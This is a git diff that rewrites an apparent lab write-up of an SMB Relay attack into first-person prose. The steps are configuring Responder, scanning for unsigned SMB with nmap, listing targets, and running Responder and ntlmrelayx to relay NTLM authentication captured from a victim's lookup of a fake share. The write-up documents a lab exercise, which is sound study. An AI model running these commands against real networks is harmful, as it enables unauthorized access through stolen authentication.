@@ -24,7 +24,6 @@
 - [Key Takeaways](#key-takeaways)
 - [References](#references)
 
-
 ## Introduction
 
 SMB Relay is a network attack where an attacker captures a user's authentication request and forwards it to victim machine instead of cracking the password. If the target system accepts the authentication, the attacker can gain access using the victim's session.
@@ -107,7 +106,7 @@ SMB Relay is a network attack where an attacker captures a user's authentication
 
 ### Step 1: Disable SMB and HTTP in Responder
 
-- First, I opened the Responder configuration file:
+First, I opened the Responder configuration file:
 
 ```bash
 sudo nano /etc/responder/Responder.conf
@@ -117,7 +116,7 @@ sudo nano /etc/responder/Responder.conf
   <img src="/writeups/02-smb-relay/images/step1-1.png" width="600">
 </p>
 
-- Inside the file, I found and changed the following settings:
+Inside the file, I found and changed the following settings:
 
 ```bash
 SMB = Off
@@ -128,7 +127,7 @@ HTTP = Off
   <img src="/writeups/02-smb-relay/images/step1-2.png" width="600">
 </p>
 
-- After that, I saved the file:
+After that, I saved the file:
 
 ```bash
 CTRL + X
@@ -160,7 +159,7 @@ nmap --script smb2-security-mode -p 445 192.168.5.0/24
 
 ### Step 3: Create Target List
 
-- Create a file for target IP addresses:
+I created a file to store the target IP addresses:
 
 ```bash
 nano targets.txt
@@ -169,7 +168,7 @@ nano targets.txt
   <img src="/writeups/02-smb-relay/images/step3-1.png" width="600">
 </p>
 
-- Add Targets:
+Inside the file, I added the target IPs:
 
 ```bash
 192.168.5.134
@@ -180,7 +179,7 @@ nano targets.txt
   <img src="/writeups/02-smb-relay/images/step3-2.png" width="600">
 </p>
 
-- Save and exit:
+After that, I saved the file:
 
 ```bash
 CTRL + X
@@ -190,7 +189,7 @@ ENTER
 
 ### Step 4: Start Responder
 
-- Run:
+I started Responder on my network interface:
 
 ```bash
 sudo responder -I eth0 -dwv
@@ -210,9 +209,7 @@ sudo responder -I eth0 -dwv
 
 ### Step 5: Start ntlmrelayx
 
-- In another terminal
-
-Run:
+In another terminal, I started the relay attack using ntlmrelayx:
 
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support
@@ -232,14 +229,12 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 
 ### Step 6: Trigger Authentication
 
-- From the victim machine:
-
-Run:
+From the victim machine, I opened File Explorer and typed:
 
 ```bash
 \\fakeshare
 ```
-Now hit Enter button. The victim system will try to connect and send NTLM authentication.
+After pressing Enter, the system tried to connect and sent NTLM authentication over the network.
 
 <p align="center">
   <img src="/writeups/02-smb-relay/images/step6.png" width="600">
@@ -247,7 +242,7 @@ Now hit Enter button. The victim system will try to connect and send NTLM authen
 
 ### Step 7: Successful Relay
 
-- The attack works successfully:
+The relay attack worked successfully, and the authentication was accepted by the target system.
 
 <p align="center">
   <img src="/writeups/02-smb-relay/images/step7.png" width="600">
